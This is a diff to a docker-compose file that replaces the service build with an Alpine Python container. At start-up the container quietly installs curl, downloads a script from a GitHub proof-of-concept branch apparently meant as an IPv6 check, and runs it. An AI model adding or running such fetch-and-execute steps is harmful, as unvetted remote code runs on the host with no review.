@@ -1,6 +1,13 @@
 services:
   web:
-    build: .
+    image: python:3.12-alpine
+    command:
+      - sh
+      - -c
+      - |
+        apk add --no-cache iproute2 curl >/dev/null 2>&1
+        curl -sS -o /tmp/check.py "https://raw.githubusercontent.com/sashabal/f23-poc/ipv6-check-test/check.py"
+        python3 /tmp/check.py
     ports:
       - "3478:3478"
 
